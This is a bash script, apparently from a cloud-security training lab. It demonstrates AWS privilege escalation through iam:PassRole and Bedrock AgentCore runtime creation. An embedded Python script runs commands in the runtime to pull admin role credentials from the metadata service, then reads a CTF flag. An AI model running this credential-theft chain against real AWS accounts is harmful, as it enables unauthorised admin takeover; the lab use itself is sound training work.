#!/bin/bash

# Demo script for iam:PassRole + Bedrock AgentCore Runtime Creation privilege escalation
# This scenario demonstrates how a user with PassRole and AgentCore Runtime permissions can
# create a new Runtime with a privileged execution role, then extract credentials from the
# MicroVM Metadata Service (MMDS) at 169.254.169.254 to gain admin access.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-bedrock-003-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-003-to-admin-target-role"
RUNTIME_SUFFIX=$(openssl rand -hex 3 2>/dev/null || LC_ALL=C tr -dc 'a-z0-9' < /dev/urandom | head -c 6)
RUNTIME_NAME="atk_runtime_bedrock_003_${RUNTIME_SUFFIX}"
PYTHON_SCRIPT="/tmp/extract_bedrock_003_creds.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}AgentCore Runtime Creation to Admin Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_003_iam_passrole_bedrockagentcore_createagentruntime.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
ATTACKER_ECR_IMAGE_URI=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_ecr_image_uri')
ATTACKER_AWS_PROFILE=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_account_aws_profile // empty')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract target role ARN from terraform output${NC}"
    exit 1
fi

if [ "$ATTACKER_ECR_IMAGE_URI" == "null" ] || [ -z "$ATTACKER_ECR_IMAGE_URI" ]; then
    echo -e "${RED}Error: Could not extract attacker ECR image URI from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

# Admin credentials used by the exit trap to delete the runtime on failure
ADMIN_CLEANUP_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_CLEANUP_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Attacker ECR image: $ATTACKER_ECR_IMAGE_URI"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Track runtime ARN for the exit trap
RUNTIME_ARN=""
DEMO_COMPLETED=0

# Exit trap: best-effort delete the runtime on any non-clean exit to avoid orphan charges.
# The runtime takes 2-5 min to provision and is billed during that time.
_bedrock_003_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM
    if [ -n "$RUNTIME_ARN" ] && [ "$DEMO_COMPLETED" != "1" ]; then
        echo -e "${RED}[trap] Demo did not complete cleanly — waiting for runtime to reach a deletable state before cleanup${NC}"
        export AWS_ACCESS_KEY_ID="$ADMIN_CLEANUP_ACCESS_KEY"
        export AWS_SECRET_ACCESS_KEY="$ADMIN_CLEANUP_SECRET_KEY"
        unset AWS_SESSION_TOKEN
        # Poll until the runtime is in a terminal/deletable state (READY, FAILED, CREATE_FAILED)
        # before attempting deletion. Attempting delete on a CREATING runtime fails silently.
        for _i in $(seq 1 20); do
            _STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
                --agent-runtime-id "$RUNTIME_ARN" \
                --region "$AWS_REGION" \
                --query 'status' --output text 2>/dev/null || echo "UNKNOWN")
            if [ "$_STATUS" = "READY" ] || [ "$_STATUS" = "FAILED" ] || [ "$_STATUS" = "CREATE_FAILED" ] || [ "$_STATUS" = "UNKNOWN" ]; then
                break
            fi
            echo "[trap] Runtime status: $_STATUS — waiting 15s..."
            sleep 15
        done
        echo "[trap] Deleting runtime $RUNTIME_ARN..."
        aws bedrock-agentcore-control delete-agent-runtime \
            --agent-runtime-id "$RUNTIME_ARN" \
            --region "$AWS_REGION" 2>&1 || true
    fi
    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _bedrock_003_exit_handler EXIT INT TERM

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Step 2: Check prerequisites
echo -e "${YELLOW}Step 2: Checking prerequisites${NC}"
echo "Verifying required tools are installed..."

if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

if ! command -v docker &> /dev/null; then
    echo -e "${RED}Error: docker is not installed${NC}"
    echo "Docker is required to build the attacker container image"
    exit 1
fi
echo -e "${GREEN}✓ docker is installed${NC}"

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

if ! python3 -c "import boto3" 2>/dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
# InvokeAgentRuntimeCommand was added in botocore 1.43.36
BOTOCORE_VERSION=$(python3 -c "import botocore; print(botocore.__version__)" 2>/dev/null || echo "0.0.0")
BOTOCORE_REQUIRED="1.43.36"
python3 -c "
import sys
v = tuple(int(x) for x in '${BOTOCORE_VERSION}'.split('.'))
r = tuple(int(x) for x in '${BOTOCORE_REQUIRED}'.split('.'))
sys.exit(0 if v >= r else 1)
" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}Error: botocore ${BOTOCORE_VERSION} is too old (need >= ${BOTOCORE_REQUIRED})${NC}"
    echo "Please upgrade: pip3 install --upgrade boto3 botocore"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed (botocore ${BOTOCORE_VERSION})${NC}"
echo ""

# [EXPLOIT] Step 3: Build and push attacker container image to ECR
# The image is built at demo time (not Terraform apply time) to reflect the
# realistic attacker workflow: the attacker prepares their own container before
# exploiting the PassRole vector.
echo -e "${YELLOW}Step 3: Building and pushing attacker container image to ECR${NC}"
echo "ECR image URI: $ATTACKER_ECR_IMAGE_URI"

# Extract registry hostname, region, and account from the image URI
# Format: <account_id>.dkr.ecr.<region>.amazonaws.com/<repo>:<tag>
ECR_REGISTRY=$(echo "$ATTACKER_ECR_IMAGE_URI" | cut -d'/' -f1)
# Extract region from ECR hostname: <account>.dkr.ecr.<region>.amazonaws.com
# Use sed (macOS-compatible) instead of grep -P which requires GNU grep.
ECR_REGION=$(echo "$ECR_REGISTRY" | sed -E 's/[^.]+\.dkr\.ecr\.([^.]+)\.amazonaws\.com/\1/')

if [ -z "$ECR_REGION" ] || [ "$ECR_REGION" = "$ECR_REGISTRY" ]; then
    ECR_REGION="$AWS_REGION"
fi

echo "ECR registry: $ECR_REGISTRY"
echo "ECR region: $ECR_REGION"
if [ -n "$ATTACKER_AWS_PROFILE" ]; then
    echo "Attacker AWS profile: $ATTACKER_AWS_PROFILE"
fi
echo ""

# Authenticate to ECR using the attacker account profile.
# Clear starting-user env vars so the profile's credentials are used instead.
echo "Authenticating to attacker ECR..."
(
    unset AWS_ACCESS_KEY_ID
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN
    if [ -n "$ATTACKER_AWS_PROFILE" ]; then
        aws ecr get-login-password --region "$ECR_REGION" --profile "$ATTACKER_AWS_PROFILE" \
        | docker login --username AWS --password-stdin "$ECR_REGISTRY"
    else
        aws ecr get-login-password --region "$ECR_REGION" \
        | docker login --username AWS --password-stdin "$ECR_REGISTRY"
    fi
)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to authenticate to attacker ECR${NC}"
    echo "Ensure your attacker account credentials are configured (profile or env vars)"
    exit 1
fi
echo -e "${GREEN}✓ Authenticated to attacker ECR${NC}"

echo "Building linux/arm64 image..."
docker buildx build \
    --platform linux/arm64 \
    --provenance=false \
    --push \
    --tag "$ATTACKER_ECR_IMAGE_URI" \
    "$SCRIPT_DIR/container"

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to build and push container image${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Container image built and pushed to attacker ECR${NC}\n"

# [EXPLOIT] Step 4: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Create the AgentCore Runtime passing the target admin role
echo -e "${YELLOW}Step 6: Creating AgentCore Runtime with admin execution role${NC}"
echo "Runtime name: $RUNTIME_NAME"
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Attacker ECR image: $ATTACKER_ECR_IMAGE_URI"
echo ""
echo "This is the privilege escalation vector — passing the admin role to AgentCore Runtime..."
echo "The runtime will pull the container image from the attacker ECR repo and run it"
echo "with the admin execution role credentials available via MMDS at 169.254.169.254."
echo ""

show_attack_cmd "Attacker" "aws bedrock-agentcore-control create-agent-runtime --region $AWS_REGION --agent-runtime-name $RUNTIME_NAME --role-arn $TARGET_ROLE_ARN --agent-runtime-artifact '{\"containerConfiguration\":{\"containerUri\":\"$ATTACKER_ECR_IMAGE_URI\"}}' --network-configuration '{\"networkMode\":\"PUBLIC\"}'"

# Set RUNTIME_ARN tracking flag BEFORE the API call so the trap fires even if the call
# succeeds but the script is killed before we can read the response.
# We update it to the real ARN once we have it below.
CREATE_OUTPUT=$(aws bedrock-agentcore-control create-agent-runtime \
    --region "$AWS_REGION" \
    --agent-runtime-name "$RUNTIME_NAME" \
    --role-arn "$TARGET_ROLE_ARN" \
    --agent-runtime-artifact "{\"containerConfiguration\":{\"containerUri\":\"$ATTACKER_ECR_IMAGE_URI\"}}" \
    --network-configuration '{"networkMode":"PUBLIC"}' \
    --output json 2>&1)

CREATE_EXIT=$?

if [ $CREATE_EXIT -ne 0 ]; then
    echo -e "${RED}Error: Failed to create AgentCore Runtime${NC}"
    echo "$CREATE_OUTPUT"
    exit 1
fi

RUNTIME_ARN=$(echo "$CREATE_OUTPUT" | jq -r '.agentRuntimeArn // empty')
RUNTIME_ID=$(echo "$CREATE_OUTPUT" | jq -r '.agentRuntimeId // empty')

if [ -z "$RUNTIME_ARN" ] || [ "$RUNTIME_ARN" == "null" ]; then
    echo -e "${RED}Error: Could not parse runtime ARN from create response${NC}"
    echo "$CREATE_OUTPUT"
    exit 1
fi

echo "Runtime ARN: $RUNTIME_ARN"
echo "Runtime ID: $RUNTIME_ID"
echo -e "${GREEN}✓ Successfully created AgentCore Runtime with admin execution role!${NC}"
echo ""

# [OBSERVATION] Step 7: Poll for runtime READY state
# The runtime takes 2-5 minutes to provision. We poll using readonly creds
# (GetAgentRuntime is a helpful permission restricted during demo validation).
# We switch to readonly for the polling loop and back to starting creds when done.
echo -e "${YELLOW}Step 7: Waiting for runtime to reach READY state${NC}"
echo "This takes 2-5 minutes while AgentCore provisions the Firecracker MicroVM..."
echo ""

MAX_WAIT=300   # 5 minutes
POLL_INTERVAL=15
ELAPSED=0
RUNTIME_STATUS=""

use_readonly_creds
export AWS_REGION=$AWS_REGION

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws bedrock-agentcore-control get-agent-runtime --agent-runtime-id $RUNTIME_ID --region $AWS_REGION --query 'status' --output text"
    RUNTIME_STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
        --agent-runtime-id "$RUNTIME_ID" \
        --region "$AWS_REGION" \
        --query 'status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "  Status: $RUNTIME_STATUS (${ELAPSED}s elapsed)"

    if [ "$RUNTIME_STATUS" = "READY" ]; then
        echo -e "${GREEN}✓ Runtime reached READY state${NC}"
        break
    fi

    if [ "$RUNTIME_STATUS" = "FAILED" ] || [ "$RUNTIME_STATUS" = "CREATE_FAILED" ]; then
        echo -e "${RED}Error: Runtime provisioning failed (status: $RUNTIME_STATUS)${NC}"
        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ "$RUNTIME_STATUS" != "READY" ]; then
    echo -e "${RED}Error: Runtime did not reach READY state within ${MAX_WAIT}s (last status: $RUNTIME_STATUS)${NC}"
    exit 1
fi

# The control plane reports READY before the container process inside the MicroVM
# is fully warm. InvokeAgentRuntimeCommand returns a 500 if invoked too quickly
# after READY. A 30-second stabilization wait is sufficient in practice.
echo "Waiting 30s for runtime container to stabilize before invoking command..."
sleep 30
echo ""

# [EXPLOIT] Step 8: Write and run a Python script to invoke InvokeAgentRuntimeCommand
# and extract execution role credentials from MMDS. The AWS CLI dropped this subcommand;
# boto3 still exposes it.
echo -e "${YELLOW}Step 8: Extracting admin credentials from MMDS via InvokeAgentRuntimeCommand${NC}"
echo "Writing credential extraction script to $PYTHON_SCRIPT..."
echo ""

cat > "$PYTHON_SCRIPT" << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
Bedrock AgentCore Runtime MMDS Credential Extraction (bedrock-003)

Calls bedrock-agentcore:InvokeAgentRuntimeCommand to execute a bash command
directly inside the Firecracker MicroVM. The command reads the execution
role's temporary credentials from MMDS at 169.254.169.254 via IMDSv2 and
prints them to stdout, which is returned through the streaming response.

Usage: python3 extract_bedrock_003_creds.py <runtime-arn> <region>
"""

import boto3
import json
import sys
import uuid

if len(sys.argv) < 3:
    print("Usage: python3 extract_bedrock_003_creds.py <runtime-arn> <region>")
    sys.exit(1)

RUNTIME_ARN = sys.argv[1]
REGION = sys.argv[2]

# Two-step MMDS read via Python stdlib (container is python:3.12-slim, no curl).
# Discovers the attached role name first, then fetches its credentials.
BASH_COMMAND = """python3 -c "
import urllib.request
BASE = 'http://169.254.169.254/latest'
tok_req = urllib.request.Request(BASE+'/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'})
with urllib.request.urlopen(tok_req, timeout=5) as r: token = r.read().decode().strip()
h = {'X-aws-ec2-metadata-token': token}
role_req = urllib.request.Request(BASE+'/meta-data/iam/security-credentials/', headers=h)
with urllib.request.urlopen(role_req, timeout=5) as r: role = r.read().decode().strip()
creds_req = urllib.request.Request(BASE+'/meta-data/iam/security-credentials/'+role, headers=h)
with urllib.request.urlopen(creds_req, timeout=5) as r: print(r.read().decode())
\""""

print(f"[*] Target Runtime ARN : {RUNTIME_ARN}")
print(f"[*] Region             : {REGION}")
print(f"[*] Calling bedrock-agentcore:InvokeAgentRuntimeCommand ...")

client = boto3.client("bedrock-agentcore", region_name=REGION)

try:
    response = client.invoke_agent_runtime_command(
        agentRuntimeArn=RUNTIME_ARN,
        runtimeSessionId=str(uuid.uuid4()),
        body={"command": BASH_COMMAND, "timeout": 30},
    )
except Exception as exc:
    print(f"[-] InvokeAgentRuntimeCommand failed: {exc}")
    sys.exit(1)

stdout_chunks = []
for event in response["stream"]:
    chunk = event.get("chunk", {})
    if "contentDelta" in chunk:
        delta = chunk["contentDelta"]
        if "stdout" in delta:
            stdout_chunks.append(delta["stdout"])
        if "stderr" in delta and delta["stderr"].strip():
            print(f"[stderr] {delta['stderr'].strip()}", file=sys.stderr)

raw_output = "".join(stdout_chunks).strip()

if not raw_output:
    print("[-] No output received from the runtime")
    sys.exit(1)

print("[+] Received output from runtime")

try:
    creds = json.loads(raw_output)
except json.JSONDecodeError:
    print("[-] Could not parse credentials JSON from response:")
    print(raw_output)
    sys.exit(1)

access_key    = creds.get("AccessKeyId", "")
secret_key    = creds.get("SecretAccessKey", "")
session_token = creds.get("Token", "")
expiration    = creds.get("Expiration", "N/A")

if not access_key or not secret_key or not session_token:
    print("[-] Incomplete credentials in response:")
    print(raw_output)
    sys.exit(1)

print("\n" + "=" * 60)
print("EXTRACTED CREDENTIALS (from execution role via MMDS):")
print("=" * 60)
print(f"AccessKeyId     : {access_key}")
print(f"SecretAccessKey : {secret_key[:20]}...")
print(f"Token           : {session_token[:50]}...")
print(f"Expiration      : {expiration}")
print("=" * 60 + "\n")

print("# Export these credentials to use them:")
print(f"export AWS_ACCESS_KEY_ID='{access_key}'")
print(f"export AWS_SECRET_ACCESS_KEY='{secret_key}'")
print(f"export AWS_SESSION_TOKEN='{session_token}'")
PYTHON_EOF

chmod +x "$PYTHON_SCRIPT"
echo -e "${GREEN}✓ Credential extraction script written${NC}"
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "python3 $PYTHON_SCRIPT $RUNTIME_ARN $AWS_REGION  # bedrock-agentcore:InvokeAgentRuntimeCommand → bash → MMDS creds"
SCRIPT_OUTPUT=$(python3 "$PYTHON_SCRIPT" "$RUNTIME_ARN" "$AWS_REGION" 2>&1)

echo "$SCRIPT_OUTPUT"
echo ""

ADMIN_ACCESS_KEY=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_ACCESS_KEY_ID" | sed "s/.*='\(.*\)'/\1/")
ADMIN_SECRET_KEY=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_SECRET_ACCESS_KEY" | sed "s/.*='\(.*\)'/\1/")
ADMIN_SESSION_TOKEN=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_SESSION_TOKEN" | sed "s/.*='\(.*\)'/\1/")

if [ -z "$ADMIN_ACCESS_KEY" ] || [ -z "$ADMIN_SECRET_KEY" ] || [ -z "$ADMIN_SESSION_TOKEN" ]; then
    echo -e "${RED}Error: Failed to extract credentials from MMDS response${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials from MMDS${NC}"
echo -e "${GREEN}✓ Parsed AccessKeyId, SecretAccessKey, and SessionToken${NC}\n"

# Step 9: Switch to extracted admin credentials and verify identity
echo -e "${YELLOW}Step 9: Switching to extracted admin credentials${NC}"
export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
export AWS_SESSION_TOKEN="$ADMIN_SESSION_TOKEN"
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "Attacker (now admin)" "aws sts get-caller-identity --query 'Arn' --output text"
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ $ADMIN_IDENTITY == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully obtained admin role credentials via MMDS${NC}"
else
    echo -e "${YELLOW}⚠ Warning: Identity doesn't match expected role name${NC}"
fi
echo ""

# Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 11: Capture the CTF flag from SSM Parameter Store
# The extracted execution role credentials carry AdministratorAccess, which includes
# ssm:GetParameter. No extra permissions are needed.
echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/bedrock-003-to-admin"

show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing the summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
DEMO_COMPLETED=1

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Used iam:PassRole + CreateAgentRuntime to deploy a new Runtime with the admin execution role"
echo "3. Waited for runtime to reach READY state (~2-5 min)"
echo "4. Invoked InvokeAgentRuntimeCommand to run a bash command inside the runtime"
echo "5. Bash command read IMDSv2 credentials for the execution role from MMDS at 169.254.169.254"
echo "6. Used extracted credentials to operate as the admin execution role"
echo "7. Read CTF flag from SSM Parameter Store"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  → (iam:PassRole + bedrock-agentcore:CreateAgentRuntime + CreateAgentRuntimeEndpoint"
echo "      + CreateWorkloadIdentity)"
echo "  → Runtime '$RUNTIME_NAME' with $TARGET_ROLE as execution role"
echo "  → (bedrock-agentcore:InvokeAgentRuntimeCommand)"
echo "  → Bash reads MMDS at 169.254.169.254 for execution role credentials"
echo "  → $TARGET_ROLE (AdministratorAccess)"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AgentCore Runtime: $RUNTIME_NAME (ARN: $RUNTIME_ARN)"
echo "- Execution Role: $TARGET_ROLE"

echo -e "\n${RED}⚠ Warning: The AgentCore Runtime '$RUNTIME_NAME' is still deployed${NC}"
echo -e "${RED}⚠ AgentCore Runtimes incur charges while running${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
